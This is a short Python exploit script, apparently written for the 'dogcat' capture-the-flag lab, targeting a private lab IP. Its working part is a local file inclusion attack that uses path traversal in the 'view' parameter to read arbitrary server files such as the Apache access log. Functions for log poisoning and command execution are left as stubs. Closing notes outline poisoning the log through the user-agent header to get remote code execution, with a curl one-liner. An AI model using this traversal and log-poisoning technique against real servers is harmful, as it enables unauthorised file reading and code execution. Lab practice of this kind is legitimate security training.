#!/usr/bin/python
# Author: arch-err
# Date: 20240209

import requests as r

### Parameters
IP="10.10.207.57"
PORT="80"


def read_file(rpath):
    url = f"http://{IP}/?view=dog/" + "../" * 10 + "/" + rpath + "&ext="
    response = r.get(url).text
    trash = """<!DOCTYPE HTML>
<html>

<head>
    <title>dogcat</title>
    <link rel="stylesheet" type="text/css" href="/style.css">
</head>

<body>
    <h1>dogcat</h1>
    <i>a gallery of various dogs or cats</i>

    <div>
        <h2>What would you like to see?</h2>
        <a href="/?view=dog"><button id="dog">A dog</button></a> <a href="/?view=cat"><button id="cat">A cat</button></a><br>
        Here you go!"""
    trash2 = """    </div>
</body>

</html>"""

    response = response.replace(trash, "")
    response = response.replace(trash2, "")

    return response


def poison_log():
    url = f"http://{IP}/?view=dog/../../../../../../../var/log/apache2/access.log&ext="






    ### This was boring so ill just do it manually, so no nice exploit today









    ### Exit if log is already poisoned
    r.get("")
    status = 0
    return status


def run_cmd(cmd):
    cmdout = 0
    return cmdout


def main():
    print(read_file("/var/log/apache2/access.log"))


if __name__ == "__main__":
    main()



### TODO:

# # Notes

# LFI through:
# `curl -s "http://$IP/?view=dog/../../../../../../../var/log/apache2/access.log&ext="`

# Poison access log via user-agent for rce

# make exploit.py
